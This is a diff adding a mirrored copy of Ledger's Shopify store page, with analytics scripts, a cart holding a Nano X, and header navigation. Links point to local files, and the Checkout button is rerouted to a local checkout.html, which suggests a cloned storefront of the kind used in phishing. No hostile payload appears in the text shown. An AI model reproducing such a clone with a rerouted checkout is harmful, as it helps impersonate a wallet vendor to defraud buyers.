+  var hasLoggedConversion = function(token) {
+    if (token) {
+      return document.cookie.indexOf('loggedConversion=' + token) !== -1;
+    }
+    return false;
+  }
+
+  var setCookieIfConversion = function(token) {
+    if (token) {
+      var twoMonthsFromNow = new Date(Date.now());
+      twoMonthsFromNow.setMonth(twoMonthsFromNow.getMonth() + 2);
+
+      document.cookie = 'loggedConversion=' + token + '; expires=' + twoMonthsFromNow;
+    }
+  }
+
+  var trekkie = window.ShopifyAnalytics.lib = window.trekkie = window.trekkie || [];
+  if (trekkie.integrations) {
+    return;
+  }
+  trekkie.methods = [
+    'identify',
+    'page',
+    'ready',
+    'track',
+    'trackForm',
+    'trackLink'
+  ];
+  trekkie.factory = function(method) {
+    return function() {
+      var args = Array.prototype.slice.call(arguments);
+      args.unshift(method);
+      trekkie.push(args);
+      return trekkie;
+    };
+  };
+  for (var i = 0; i < trekkie.methods.length; i++) {
+    var key = trekkie.methods[i];
+    trekkie[key] = trekkie.factory(key);
+  }
+  trekkie.load = function(config) {
+    trekkie.config = config || {};
+    trekkie.config.initialDocumentCookie = document.cookie;
+    var first = document.getElementsByTagName('script')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.onerror = function(e) {
+      var scriptFallback = document.createElement('script');
+      scriptFallback.type = 'text/javascript';
+      scriptFallback.onerror = function(error) {
+              var Monorail = {
+      produce: function produce(monorailDomain, schemaId, payload) {
+        var currentMs = new Date().getTime();
+        var event = {
+          schema_id: schemaId,
+          payload: payload,
+          metadata: {
+            event_created_at_ms: currentMs,
+            event_sent_at_ms: currentMs
+          }
+        };
+        return Monorail.sendRequest("https://" + monorailDomain + "/v1/produce", JSON.stringify(event));
+      },
+      sendRequest: function sendRequest(endpointUrl, payload) {
+        // Try the sendBeacon API
+        if (window && window.navigator && typeof window.navigator.sendBeacon === 'function' && typeof window.Blob === 'function' && !Monorail.isIos12()) {
+          var blobData = new window.Blob([payload], {
+            type: 'text/plain'
+          });
+    
+          if (window.navigator.sendBeacon(endpointUrl, blobData)) {
+            return true;
+          } // sendBeacon was not successful
+    
+        } // XHR beacon   
+    
+        var xhr = new XMLHttpRequest();
+    
+        try {
+          xhr.open('POST', endpointUrl);
+          xhr.setRequestHeader('Content-Type', 'text/plain');
+          xhr.send(payload);
+        } catch (e) {
+          console.log(e);
+        }
+    
+        return false;
+      },
+      isIos12: function isIos12() {
+        return window.navigator.userAgent.lastIndexOf('iPhone; CPU iPhone OS 12_') !== -1 || window.navigator.userAgent.lastIndexOf('iPad; CPU OS 12_') !== -1;
+      }
+    };
+    Monorail.produce('monorail-edge.shopifysvc.com',
+      'trekkie_storefront_load_errors/1.1',
+      {shop_id: 29744858,
+      theme_id: 120688836680,
+      app_name: "storefront",
+      context_url: window.location.href,
+      source_url: "https://cdn.shopify.com/s/trekkie.storefront.cfdeeb94260b8cba731334880e0cd9b5350eff24.min.js"});
+
+      };
+      scriptFallback.async = true;
+      scriptFallback.src = 'https://cdn.shopify.com/s/trekkie.storefront.cfdeeb94260b8cba731334880e0cd9b5350eff24.min.js';
+      first.parentNode.insertBefore(scriptFallback, first);
+    };
+    script.async = true;
+    script.src = 'https://cdn.shopify.com/s/trekkie.storefront.cfdeeb94260b8cba731334880e0cd9b5350eff24.min.js';
+    first.parentNode.insertBefore(script, first);
+  };
+  trekkie.load(
+    {"Trekkie":{"appName":"storefront","development":false,"defaultAttributes":{"shopId":29744858,"isMerchantRequest":null,"themeId":120688836680,"themeCityHash":"12902853466590801845","contentLanguage":"en","currency":"EUR"},"isServerSideCookieWritingEnabled":true,"monorailRegion":"shop_domain"},"Snap Pixel":{"pixelId":"5fefacb2-108d-4d83-8c43-7b198bce2a67"},"Session Attribution":{},"S2S":{"facebookCapiEnabled":false,"source":"trekkie-storefront-renderer"}}
+  );
+
+  var loaded = false;
+  trekkie.ready(function() {
+    if (loaded) return;
+    loaded = true;
+
+    window.ShopifyAnalytics.lib = window.trekkie;
+    
+
+    var originalDocumentWrite = document.write;
+    document.write = customDocumentWrite;
+    try { window.ShopifyAnalytics.merchantGoogleAnalytics.call(this); } catch(error) {};
+    document.write = originalDocumentWrite;
+
+    window.ShopifyAnalytics.lib.page(null,{"pageType":"page","resourceType":"page","resourceId":15355150378});
+
+    var match = window.location.pathname.match(/checkouts\/(.+)\/(thank_you|post_purchase)/)
+    var token = match? match[1]: undefined;
+    if (!hasLoggedConversion(token)) {
+      setCookieIfConversion(token);
+      
+    }
+  });
+
+  
+      var eventsListenerScript = document.createElement('script');
+      eventsListenerScript.async = true;
+      eventsListenerScript.src = "//cdn.shopify.com/shopifycloud/shopify/assets/shop_events_listener-65cd0ba3fcd81a1df33f2510ec5bcf8c0e0958653b50e3965ec972dd638ee13f.js";
+      document.getElementsByTagName('head')[0].appendChild(eventsListenerScript);
+    
+})();</script>
+<script class="boomerang">
+(function () {
+  if (window.BOOMR && (window.BOOMR.version || window.BOOMR.snippetExecuted)) {
+    return;
+  }
+  window.BOOMR = window.BOOMR || {};
+  window.BOOMR.snippetStart = new Date().getTime();
+  window.BOOMR.snippetExecuted = true;
+  window.BOOMR.snippetVersion = 12;
+  window.BOOMR.application = "storefront-renderer";
+  window.BOOMR.themeName = "";
+  window.BOOMR.themeVersion = "";
+  window.BOOMR.shopId = 29744858;
+  window.BOOMR.themeId = 120688836680;
+  window.BOOMR.renderRegion = "gcp-us-east1";
+  window.BOOMR.url =
+    "js/shopify-boomerang-1.0.0.min.js";
+  var where = document.currentScript || document.getElementsByTagName("script")[0];
+  var parentNode = where.parentNode;
+  var promoted = false;
+  var LOADER_TIMEOUT = 3000;
+  function promote() {
+    if (promoted) {
+      return;
+    }
+    var script = document.createElement("script");
+    script.id = "boomr-scr-as";
+    script.src = window.BOOMR.url;
+    script.async = true;
+    parentNode.appendChild(script);
+    promoted = true;
+  }
+  function iframeLoader(wasFallback) {
+    promoted = true;
+    var dom, bootstrap, iframe, iframeStyle;
+    var doc = document;
+    var win = window;
+    window.BOOMR.snippetMethod = wasFallback ? "if" : "i";
+    bootstrap = function(parent, scriptId) {
+      var script = doc.createElement("script");
+      script.id = scriptId || "boomr-if-as";
+      script.src = window.BOOMR.url;
+      BOOMR_lstart = new Date().getTime();
+      parent = parent || doc.body;
+      parent.appendChild(script);
+    };
+    if (!window.addEventListener && window.attachEvent && navigator.userAgent.match(/MSIE [67]./)) {
+      window.BOOMR.snippetMethod = "s";
+      bootstrap(parentNode, "boomr-async");
+      return;
+    }
+    iframe = document.createElement("IFRAME");
+    iframe.src = "about:blank";
+    iframe.title = "";
+    iframe.role = "presentation";
+    iframe.loading = "eager";
+    iframeStyle = (iframe.frameElement || iframe).style;
+    iframeStyle.width = 0;
+    iframeStyle.height = 0;
+    iframeStyle.border = 0;
+    iframeStyle.display = "none";
+    parentNode.appendChild(iframe);
+    try {
+      win = iframe.contentWindow;
+      doc = win.document.open();
+    } catch (e) {
+      dom = document.domain;
+      iframe.src = "javascript:var d=document.open();d.domain='" + dom + "';void(0);";
+      win = iframe.contentWindow;
+      doc = win.document.open();
+    }
+    if (dom) {
+      doc._boomrl = function() {
+        this.domain = dom;
+        bootstrap();
+      };
+      doc.write("<body onload='document._boomrl();'>");
+    } else {
+      win._boomrl = function() {
+        bootstrap();
+      };
+      if (win.addEventListener) {
+        win.addEventListener("load", win._boomrl, false);
+      } else if (win.attachEvent) {
+        win.attachEvent("onload", win._boomrl);
+      }
+    }
+    doc.close();
+  }
+  var link = document.createElement("link");
+  if (link.relList &&
+    typeof link.relList.supports === "function" &&
+    link.relList.supports("preload") &&
+    ("as" in link)) {
+    window.BOOMR.snippetMethod = "p";
+    link.href = window.BOOMR.url;
+    link.rel = "preload";
+    link.as = "script";
+    link.addEventListener("load", promote);
+    link.addEventListener("error", function() {
+      iframeLoader(true);
+    });
+    setTimeout(function() {
+      if (!promoted) {
+        iframeLoader(true);
+      }
+    }, LOADER_TIMEOUT);
+    BOOMR_lstart = new Date().getTime();
+    parentNode.appendChild(link);
+  } else {
+    iframeLoader(false);
+  }
+  function boomerangSaveLoadTime(e) {
+    window.BOOMR_onload = (e && e.timeStamp) || new Date().getTime();
+  }
+  if (window.addEventListener) {
+    window.addEventListener("load", boomerangSaveLoadTime, false);
+  } else if (window.attachEvent) {
+    window.attachEvent("onload", boomerangSaveLoadTime);
+  }
+  if (document.addEventListener) {
+    document.addEventListener("onBoomerangLoaded", function(e) {
+      e.detail.BOOMR.init({
+        ResourceTiming: {
+          enabled: true,
+          trackedResourceTypes: ["script", "img", "css"]
+        },
+      });
+      e.detail.BOOMR.t_end = new Date().getTime();
+    });
+  } else if (document.attachEvent) {
+    document.attachEvent("onpropertychange", function(e) {
+      if (!e) e=event;
+      if (e.propertyName === "onBoomerangLoaded") {
+        e.detail.BOOMR.init({
+          ResourceTiming: {
+            enabled: true,
+            trackedResourceTypes: ["script", "img", "css"]
+          },
+        });
+        e.detail.BOOMR.t_end = new Date().getTime();
+      }
+    });
+  }
+})();</script>
+<script id="web-pixels-manager-setup">(function e(e,n,a,o,t){e&&(window.Shopify=window.Shopify||{},window.Shopify.analytics=window.Shopify.analytics||{},window.Shopify.analytics.replayQueue=[],window.Shopify.analytics.publish=function(e,n,a){window.Shopify.analytics.replayQueue.push([e,n,a])});var r,i,s,l,d,c,p,u,f=a+"/"+o+"."+function(){var e="legacy",n="unknown",a=null,o=navigator.userAgent.match(/(Firefox|Chrome)\/(\d+)/i),t=navigator.userAgent.match(/(Edg)\/(\d+)/i),r=navigator.userAgent.match(/(Version)\/(\d+)(.+)(Safari)\/(\d+)/i);r?(n="safari",a=parseInt(r[2],10)):t?(n="edge",a=parseInt(t[2],10)):o&&(n=o[1].toLocaleLowerCase(),a=parseInt(o[2],10));var i={chrome:60,firefox:55,safari:11,edge:80}[n];return void 0!==i&&null!==a&&i<=a&&(e="modern"),e}()+".js";r={src:f,async:!0,onload:function(){if(e){var a=window.webPixelsManager.init(e);n(a),window.Shopify.analytics.replayQueue.forEach((function(e){a.publishCustomEvent(e[0],e[1],e[2])})),window.Shopify.analytics.replayQueue=[],window.Shopify.analytics.publish=a.publishCustomEvent}},onerror:function(){var n=(e.storefrontBaseUrl?e.storefrontBaseUrl.replace(/\/$/,""):self.location.origin)+"/.well-known/shopify/monorail/unstable/produce_batch",a=JSON.stringify({metadata:{event_sent_at_ms:(new Date).getTime()},events:[{schema_id:"web_pixels_manager_load/2.0",payload:{version:t||"latest",page_url:self.location.href,status:"failed",error_msg:f+" has failed to load"},metadata:{event_created_at_ms:(new Date).getTime()}}]});try{if(self.navigator.sendBeacon.bind(self.navigator)(n,a))return!0}catch(e){}const o=new XMLHttpRequest;try{return o.open("POST",n,!0),o.setRequestHeader("Content-Type","text/plain"),o.send(a),!0}catch(e){console&&console.warn&&console.warn("[Web Pixels Manager] Got an unhandled error while logging a load error.")}return!1}},i=document.createElement("script"),s=r.src,l=r.async||!0,d=r.onload,c=r.onerror,p=document.head,u=document.body,i.async=l,i.src=s,d&&i.addEventListener("load",d),c&&i.addEventListener("error",c),p?p.appendChild(i):u?u.appendChild(i):console.error("Did not find a head or body element to append the script")})({shopId: 29744858,storefrontBaseUrl: "https://shop.ledger.com",cdnBaseUrl: "https://cdn.shopify.com",surface: "storefront-renderer",enabledBetaFlags: ["web_pixels_use_shop_domain_monorail_endpoint"],webPixelExtensionBaseUrl: "https://cdn.shopify.com",webPixelsConfigList: [],initData: {"customer":null,"cart":{"id":"d153dd0dff24f4169b230bd7d0262d52","cost":{"totalAmount":{"amount":149.0,"currencyCode":"EUR"}},"lines":[{"cost":{"totalAmount":{"amount":149.0,"currencyCode":"EUR"}},"merchandise":{"id":"39493371166792","image":{"src":"https:\/\/cdn.shopify.com\/s\/files\/1\/2974\/4858\/products\/Ledger_Nano_X_Onyx_Black.png?v=1658828796"},"price":{"amount":149.0,"currencyCode":"EUR"},"sku":"lnx","title":"Onyx Black","product":{"id":"1829667700778","title":"Ledger Nano X","vendor":"Ledger"}},"quantity":1}],"totalQuantity":1},"productVariants":[],"checkout":null},},function pageEvents(webPixelsManagerAPI) {webPixelsManagerAPI.publish("page_viewed");},"https://cdn.shopify.com/shopifycloud/web-pixels-manager/0.0.186","browser","0.0.186");</script></head>
+
+<body id="template-page-generic"
+  class="">
+
+  <script>
+
+    jQuery(function() {
+      
+
+      jQuery('.header__cart').click(function(){ 
+
+        jQuery('.cart__flyout').addClass('cart__flyout--active')
+        jQuery('.cart__flyout-cart').addClass('cart__flyout-cart--active')
+
+        });
+      jQuery('#add-to-cart-button').click(function(){ 
+
+        jQuery('.cart__flyout').addClass('cart__flyout--active')
+        jQuery('.cart__flyout-cart').addClass('cart__flyout-cart--active')
+
+        });
+      jQuery('.subbar__atc-form').click(function(){ 
+
+        jQuery('.cart__flyout').addClass('cart__flyout--active')
+        jQuery('.cart__flyout-cart').addClass('cart__flyout-cart--active')
+
+        });
+      jQuery('.cart__button--checkout').click(function(){ 
+
+        window.location.href="checkout.html"
+
+        });
+    });
+    
+    </script>
+    
+    
+    <div class="cart__flyout">
+      <div class="cart__flyout-overlay"></div>
+      <div class="cart__flyout-cart cart__flyout-cart--active">
+        <div class="cart__header">
+          <div class="cart__header-caption">
+            <span id="cart-review-header">Review Your Cart</span>
+            <span id="cart-empty-header" style="display: none;">Your cart is empty</span>
+          </div>
+    
+          <div class="cart__header-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill="#000" d="M15.333 2.778H4.008l-.243-1.24A.667.667 0 0 0 3.111 1H.333A.333.333 0 0 0 0 1.333V2c0 .184.15.333.333.333h2.23l1.932 9.88a1.778 1.778 0 1 0 3.06 1.23v.001c0-.312-.081-.618-.238-.888h4.033a1.778 1.778 0 1 0 2.77-.393l.029-.132a.667.667 0 0 0-.652-.809H5.66L5.4 9.89h8.677a.667.667 0 0 0 .652-.525l1.256-5.778a.667.667 0 0 0-.652-.808zM5.778 14.11a.667.667 0 1 1 .001-1.335.667.667 0 0 1-.001 1.335zm7.11 0a.667.667 0 1 1 .002-1.335.667.667 0 0 1-.001 1.335zm.652-5.555H5.138l-.87-4.445h10.238l-.966 4.445z"></path></svg>
+                <div class="header__cart--count">1</div>
+          </div>
+          <div class="cart__header-close">
+            <div class="icon__x-close">
+              <span></span>
+              <span></span>
+            </div>
+          </div>
+        </div>
+        <div class="cart__preorder" style="display: none;">
+          <div class="cart_preorder_alert" id="cart_error_message">Ledger Nano S Nem edition cannot be shipped with other products. If you wish to purchase our regular products, please place a separate order.</div>
+        </div>
+        
+        <div class="cart__content">
+        <div class="cart__content-item-form">
+            <div class="cart__content-item">
+              <div class="cart__content-item-product">
+                <div class="cart__item-image" data-tag="lnx">
+                  <img src="images/Ledger_Nano_X_Onyx_Black.png" alt="Ledger Nano X - Onyx Black">
+                </div>
+                <div class="cart__item-details">
+                  <div class="cart__details">
+                    <div class="cart__details-title">
+                      <h2>Ledger Nano X - Onyx Black</h2>
+                    </div>
+                    <div class="cart__details-trash">
+                      
+                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 12"><path fill="#142533" d="M5.5 4.406V9.47a.281.281 0 0 1-.281.281h-.563a.281.281 0 0 1-.281-.281V4.406c0-.155.126-.281.281-.281h.563c.155 0 .281.126.281.281zm2.344-.281H7.28A.281.281 0 0 0 7 4.406V9.47c0 .155.126.281.281.281h.563a.281.281 0 0 0 .281-.281V4.406a.281.281 0 0 0-.281-.281zm3.093-2.25c.311 0 .563.252.563.563v.28a.281.281 0 0 1-.281.282h-.469v7.875c0 .621-.504 1.125-1.125 1.125h-6.75a1.125 1.125 0 0 1-1.125-1.125V3h-.469A.281.281 0 0 1 1 2.719v-.281c0-.311.252-.563.563-.563h1.744L4.104.546C4.307.207 4.674 0 5.068 0h2.364c.395 0 .76.207.964.546l.797 1.329h1.745zm-6.319 0h3.264l-.41-.682a.14.14 0 0 0-.12-.068H5.148a.14.14 0 0 0-.12.068l-.41.682zM9.625 3h-6.75v7.734c0 .078.063.141.14.141h6.47a.14.14 0 0 0 .14-.14V3z"></path></svg>
+                      
+                    </div>
+                  </div>
+                  <div class="cart__details">
+                    <input type="hidden" name="variant_id" class="cart__item-variant_id" value="39493371166792">
+                    <div class="cart__details-quantity">
+                      <div class="cart__quantity cart__quantity--dec"></div>
+                      <input type="number" class="cart__quantity cart__quantity-input" name="quantity" min="0" value="1" disabled="">
+                      <div class="cart__quantity cart__quantity--inc"></div>
+                    </div>
+                    <div class="cart__details-price">
+                      <span data-flow-localize="cart-item-price">CN¥1,251.00</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+    
+        </div>
+        
+          <div class="cart__flyout-recommended">
+            <div id="shopify-section-product-recommendation" class="shopify-section">
+    
+    <div class="cart__recommended">
+      <!-- <div class="cart__recommended-header">
+        Recommended for you
+      </div> -->
+      
+      <div class="cart__recommended-products">
+        <!-- <div class="cart__recommended-product" id="cart-reco-ledger-nano-pod" data-personalize-recommendation="" data-variant-rec="ledger-nano-x">
+        <form action="/cart/add" class="cart__recommended-form">
+            <a href="/products/ledger-nano-pod?variant=39539027050568">
+                <div class="cart__recommended-image" data-tag=""> 
+                    
+                        <img src="//cdn.shopify.com/s/files/1/2974/4858/products/POD_NanoX_Final12_150x.png?v=1665393182" alt="Ledger Nano X Pod">
+                    
+                </div>
+            </a>
+            <div class="cart__recommended-details  ">
+                <a href="/products/ledger-nano-pod?variant=39539027050568">
+                    <h2>Ledger Nano X Pod</h2>
+                </a>
+                
+        <div class="yotpo bottomLine yotpo-small" data-product-id="39539027050568" data-yotpo-element-id="10"> <span class="yotpo-display-wrapper" style="visibility: hidden;">   <div class="yotpo-clr"></div> </span></div>
+    
+                <div class="cart__recommended-content">
+                    
+                    <div class="cart__recommended-price only__largescreen">
+    
+    <span class="flow-price flow-price__item add-to-cart__price--original flow-localized " flow-variant="39539027050568" flow-selector="prices.item.label" flow-default="€39,00" data-price="39,00" data-price-localized="CN¥266.00">CN¥266.00
+    </span>
+    
+                        <div class="add-to-cart__caption" flow-id="renders">
+                            
+    
+                        </div>
+                    </div>
+                     
+                        <input type="hidden" class="cart__recommended-id" name="id" value="39539027050568">
+                     
+                    <input type="hidden" class="cart__recommended-sku" name="sku" value="Ledger Nano X Pod">
+                    <input type="hidden" class="cart__recommended-price" name="price" value="€39,00">
+                    <input type="hidden" class="cart__recommended-quantity" name="quantity" value="1">
+                    <button type="submit" class="cart__recommended-atc button primary" data-sku="">
+                    <div class="only__mobile only__mobile--inline">
+    
+    
+    
+    <span class="flow-price flow-price__item add-to-cart__price--original flow-localized " flow-variant="39539027050568" flow-selector="prices.item.label" flow-default="€39,00" data-price="39,00" data-price-localized="CN¥266.00">CN¥266.00
+    </span>
+    
+                        <div class="add-to-cart__caption" flow-id="renders">
+                            
+                        </div>
+                    </div>
+                    <span class="only__mobile only__mobile--inline"> - </span>Add</button>
+                </div>
+            </div>	
+        </form>
+      </div> -->
+    </div>
+    
+    </div>
+    
+    </div>
+          </div>
+        
+        <div class="cart__summary">
+          <div class="cart__summary-cost">
+            <!-- il n'est pas dans la maquette mais je suis sur ils vont le vouloir donc pour l'instant comment (fait le 19/07/2022)
+              <div class="cart__cost cart__cost--subtotal">
+                <span class="cart__cost-title">
+                  
+                    Subtotal
+                  
+                </span>
+                <span class="cart__cost-price" data-flow-localize="cart-subtotal"></span>
+              </div>
+            -->
+            <div class="cart__cost cart__cost--subtotal">
+              <span class="cart__cost-title">Shipping</span>
+              <span class="cart-shipping" data-flow-localize="cart-shipping">CN¥0.00</span>
+            </div>
+                <div class="cart__cost cart__cost--subtotal">
+              <span class="cart__cost-title" data-flow-localize="cart-tax-name">增值税</span>
+              <span class="cart__cost-price" data-flow-localize="cart-tax"></span>
+            </div>
+            <!-- Discount -->
+            <!-- Discount -->
+            <div class="cart__cost cart__cost--total">
+              <span class="cart__cost-title">
+                
+                Total
+                
+              </span>
+              <span class="cart__cost-price cart__cost-price--total" data-flow-localize="cart-total">CN¥1,251.00</span>
+            </div>			
+          </div>
+          <div class="cart__summary-buttons">
+            
+              <button type="submit" title="Checkout" class="button primary cart__button cart__button--checkout">Checkout</button>
+            
+          </div>
+        </div>
+        
+    </div>
+      
+      </div>
+    </div>
+
+
+
+  <!-- Google Tag Manager (noscript) -->
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W5FKZ2N" height="0" width="0"
+      style="display: none; visibility: hidden"></iframe></noscript>
+  <script>
+  const currentLanguage = "en"
+  const availLanguages = []
+  let storeLanguage = null
+  
+    availLanguages.push({
+      primary: true,
+      isoCode: "en",
+      rootUrl: "/",
+      name: "English"
+    })
+    
+      storeLanguage = {
+        primary: true,
+        isoCode: "en",
+        rootUrl: "/",
+        name: "English"
+      }
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "ar",
+      rootUrl: "/ar",
+      name: "العربية"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "de",
+      rootUrl: "/de",
+      name: "Deutsch"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "es",
+      rootUrl: "/es",
+      name: "Español"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "fr",
+      rootUrl: "/fr",
+      name: "français"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "ja",
+      rootUrl: "/ja",
+      name: "日本語"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "ko",
+      rootUrl: "/ko",
+      name: "한국어"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "pt-BR",
+      rootUrl: "/pt-br",
+      name: "português (Brasil)"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "ru",
+      rootUrl: "/ru",
+      name: "русский"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "tr",
+      rootUrl: "/tr",
+      name: "Türkçe"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "zh-CN",
+      rootUrl: "/zh-cn",
+      name: "简体中文"
+    })
+    
+  
+
+  window.__LEDGER__ = { ...window.__LEDGER__, storeLanguage, availLanguages }
+
+  window.addEventListener('load', () => window.__LEDGER__.language.onLoad())
+</script>
+
+  <!-- End Google Tag Manager (noscript) -->
+  <div id="shopify-section-header" class="shopify-section">
+
+
+
+
+
+
+<header id="header" class="header--fixed " data-shipping-method="Express" data-shipping-message="P.O. boxes are not available with this shipping method">
+  <div id="language-popup" class="is-hidden">
+  <div class="icon__x-close" id="language-popup-close">
+    <span></span>
+    <span></span>
+  </div>
+  <div class="lp-row">
+    <div class="lp-title">
+      <span class="title">
+        <span id="discoverability_title_1"></span>
+        <span id="user-language"></span>
+        <span id="discoverability_title_2"></span>
+      </span>
+    </div>
+    <div class="buttons">
+      <button id="language-popup-set-default"></button>
+      <button id="language-popup-no"></button>
+    </div>
+  </div>
+  <div class="lp-row" id="discoverability_description"></div>
+</div>
+
+
+  
+    
+  
+
+	<div class="header-container header__subbar header__subbar--active 
+">
+		<div class="header js-accordion__list  ">
+			<div class="header__logo">
+        
+        <a href="index.html" title="Ledger" class="logo">
+          <picture class="flexbox">
+            <source media="(min-width: 1024px)" srcset="images/ledger-logo-long.svg"/>
+            <source media="(max-width: 1024px)" srcset="images/ledger-logo-short.svg" />
+            <img src="images/ledger-logo-long.svg" alt="Ledger" />
+          </picture>
+        </a>
+        
+			</div>
+      <div class="header__nav js-accordion__list-expander">
+				
+        <nav class="main-navigation" id="main-navigation">
+          <ul>
+            <li class=" has-children">
+              <a href="#" title="Products">Products</a>
+              <ul>
+                <!-- <li>
+                  <a href="ledger-stax.html" title="Ledger Stax">Ledger Stax</a>
+                </li> -->
+                <li>
+                  <a href="ledger-nano-x.html" title="Ledger Nano X">Ledger Nano X</a>
+                </li>
+                <li>
+                  <a href="ledger-nano-s-plus.html" title="Ledger Nano S Plus">Ledger Nano S
+                    Plus</a>
+                </li>
+                <li>
+                  <a href="hardware-wallets-comparison.html" title="Compare our devices">Compare
+                    our devices</a>
+                </li>
+                 <!--<li>
+                  <a href="shop.html#category-bundle" title="Packs">Packs</a>
+                </li>
+                <li>
+                  <a href="shop.html#category-accessories" title="Accessories">Accessories</a>
+                </li>
+                <li>
+                  <a href="shop.html" title="See all products">See all products</a>
+                </li> -->
+                <li>
+                  <a href="ledger-live.html" title="Download Ledger Live">Download Ledger Live</a>
+                </li>
+                <li>
+                  <a href="supported-crypto-assets.html" title="Supported crypto">Supported crypto</a>
+                </li>
+              </ul>
+            </li>
+            <li class=" has-children">
+              <a href="" title="App and services">App and services</a>
+              <ul>
+                <li>
+                  <a href="ledger-live.html" title="Ledger Live">Ledger Live</a>
+                </li>
+                <!-- <li>
+                  <a href="market.html" title="Ledger Market">Ledger Market</a>
+                </li> -->
+                <li>
+                  <a href="cl-card.html" title="The CL Card">The CL Card</a>
+                </li>
+                <li>
+                  <a href="supported-services.html" title="Supported Services">Supported Services</a>
+                </li>
+                <li>
+                  <a href="price.html" title="Crypto Prices">Crypto Prices</a>
+                </li>
+              </ul>
+            </li>
+            <li class=" has-children">
+              <a href="#" title="Learn">Learn</a>
+              <ul>
+                <!-- <li>
+                  <a target="_blank" href="academy.html" title="Ledger Academy">Ledger Academy</a>
+                </li> -->
+                <li>
+                  <a href="down-the-rabbit-hole.html" title="Our crypto show">Our crypto show</a>
+                </li>
+                <li>
+                  <a href="livestream.html" title="Live Sessions">Live Sessions</a>
+                </li>
+                <!-- <li>
+                  <a href="the-ledger-podcast.html" title="The Ledger Podcast">The Ledger Podcast</a>
+                </li>
+                <li>
+                  <a href="basic-basics/about-crypto.html" title="Beginners guide">Beginners guide</a>
+                </li>
+                <li>
+                  <a href="why-you-should-choose-ledger-hardware-wallets.html" title="Why choose Ledger">Why choose
+                    Ledger</a>
+                </li> -->
+                <li>
+                  <a href="buy-bitcoin.html" title="How to buy Bitcoin">How to buy Bitcoin</a>
+                </li>
+                <li>
+                  <a href="blogs.html" title="Our Blogs">Our Blogs</a>
+                </li>
+              </ul>
+            </li>
+            <!-- <li class=" has-children">
+              <a href="#" title="For Business">For Business</a>
+              <ul>
+                <li>
+                  <a target="_blank" href="https://enterprise.ledger.com?utm_source=mainsite&utm_medium=header"
+                    title="Ledger Enterprise Solutions">Ledger Enterprise Solutions</a>
+                </li>
+                <li>
+                  <a href="partners.html" title="Ledger Partners">Ledger Partners</a>
+                </li>
+                <li>
+                  <a href="co-branded-partnership.html" title="Ledger Co-branded Partnership">Ledger Co-branded
+                    Partnership</a>
+                </li>
+              </ul>
+            </li> -->
+            <!-- <li class="">
+              <a href="developers.html" title="For developers">For developers</a>
+            </li> -->
+            <li class="">
+              <a target="_blank" href="support.html" title="Support">Support</a>
+            </li>
+  
+            <li class="has-children language-switcher">
+              <a href="#" class="activeLanguage" data-isocode="en">English</a>
+              <ul class="submenu">
+                <li>
+                  <a href="ar" title="" data-name="Arabic" data-isocode="ar" class="localeItem">العربية</a>
+                </li>
+                <li>
+                  <a href="zh-hans" title="" data-name="Chinese (Simplified)" data-isocode="zh-hans"
+                    class="localeItem">简体中文</a>
+                </li>
+                <li>
+                  <a href="fr" title="" data-name="French" data-isocode="fr" class="localeItem">Français</a>
+                </li>
+                <li>
+                  <a href="de" title="" data-name="German" data-isocode="de" class="localeItem">Deutsch</a>
+                </li>
+                <li>
+                  <a href="ru" title="" data-name="Russian" data-isocode="ru" class="localeItem">Русский</a>
+                </li>
+                <li>
+                  <a href="es" title="" data-name="Spanish" data-isocode="es" class="localeItem">Español</a>
+                </li>
+                <li>
+                  <a href="ja" title="" data-name="Japanese" data-isocode="ja" class="localeItem">日本語</a>
+                </li>
+                <li>
+                  <a href="ko" title="" data-name="Korean" data-isocode="ko" class="localeItem">한국어</a>
+                </li>
+                <li>
+                  <a href="tr" title="" data-name="Turkish" data-isocode="tr" class="localeItem">Türkçe</a>
+                </li>
+                <li>
+                  <a href="pt-br" title="" data-name="Portuguese (Brazil)" data-isocode="pt-br"
+                    class="localeItem">Português</a>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </nav>
+          <span id="bg-menu-mobile"></span>
+				
+			</div>
+      
+
+			<div class="header__cart">
+				<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill="#000" d="M15.333 2.778H4.008l-.243-1.24A.667.667 0 0 0 3.111 1H.333A.333.333 0 0 0 0 1.333V2c0 .184.15.333.333.333h2.23l1.932 9.88a1.778 1.778 0 1 0 3.06 1.23v.001c0-.312-.081-.618-.238-.888h4.033a1.778 1.778 0 1 0 2.77-.393l.029-.132a.667.667 0 0 0-.652-.809H5.66L5.4 9.89h8.677a.667.667 0 0 0 .652-.525l1.256-5.778a.667.667 0 0 0-.652-.808zM5.778 14.11a.667.667 0 1 1 .001-1.335.667.667 0 0 1-.001 1.335zm7.11 0a.667.667 0 1 1 .002-1.335.667.667 0 0 1-.001 1.335zm.652-5.555H5.138l-.87-4.445h10.238l-.966 4.445z"/></svg>
+        <div class="header__cart--count header__cart--count--hidden"></div>
+			</div>
+      <div id="mobile-menu"><i class="icon-stream"></i></div>
+		</div>
+	</div>
+  <span class="bg-subnav-mobile"></span></header>
+
+
+
+
+</div>
+  <div id="shopify-section-dialog" class="shopify-section"><div id="simpleDialog" class="simple-dialog">
+  <div class="simple-dialog-form">
+    <div class="simple-dialog-header">
+        <div id="simple-dialog-header"></div>
+        <button id="simple-close-dialog" value="cancel" class="icon-close"></button>
+    </div>
+    <div id="simple-dialog-body" class="simple-dialog-body"></div>
+    <div id="simple-dialog-footer" class="simple-dialog-footer"></div>
+  </div>
+</div>
+
+<script id="simple-dialog" type="">
